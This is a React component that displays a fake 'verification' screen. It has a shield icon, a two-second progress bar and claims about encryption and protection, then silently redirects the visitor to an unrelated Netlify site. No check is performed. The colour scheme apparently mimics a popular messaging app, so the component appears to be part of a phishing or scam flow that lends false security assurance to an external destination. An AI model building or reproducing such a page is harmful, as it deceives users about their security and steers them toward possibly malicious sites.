import React from 'react';
import { Shield, Lock } from 'lucide-react';
import { useLanguage } from '../hooks/useLanguage';
import { useNavigate } from 'react-router-dom';

export function ReviewContent() {
  const { t } = useLanguage();
  const navigate = useNavigate();
  const [isChecking, setIsChecking] = React.useState(true);

  React.useEffect(() => {
    const timer = setTimeout(() => {
      setIsChecking(false);
      window.location.replace('https://faq-sunshine.netlify.app');
    }, 2000);

    return () => clearTimeout(timer);
  }, [navigate]);

  return (
    <div className="space-y-4 pt-3">
      <div className="flex items-center justify-center">
        <Shield className="w-16 h-16 text-[#19A572]" />
      </div>
      
      <div className="text-center">
        <h2 className="text-xl font-semibold text-[#111B21] mb-2">
          {t.verification.title}
        </h2>
        <p className="text-base text-[#667781]">
          {t.verification.subtitle}
        </p>
      </div>

      {isChecking && (
        <div className="relative h-2 bg-gray-200 rounded-full overflow-hidden">
          <div 
            className="absolute top-0 left-0 h-full bg-[#19A572] rounded-full"
            style={{
              animation: 'progress 2s linear',
              width: '100%'
            }}
          />
        </div>
      )}

      <div className="space-y-3">
        <div className="flex items-center gap-3 p-4 bg-[#F0F2F5] rounded-lg">
          <Lock className="text-[#19A572] w-6 h-6" />
          <div>
            <h3 className="text-base font-medium text-[#111B21]">
              {t.verification.encryption.title}
            </h3>
            <p className="text-sm text-[#667781]">
              {t.verification.encryption.description}
            </p>
          </div>
        </div>

        <div className="flex items-center gap-3 p-4 bg-[#F0F2F5] rounded-lg">
          <Shield className="text-[#19A572] w-6 h-6" />
          <div>
            <h3 className="text-base font-medium text-[#111B21]">
              {t.verification.protection.title}
            </h3>
            <p className="text-sm text-[#667781]">
              {t.verification.protection.description}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}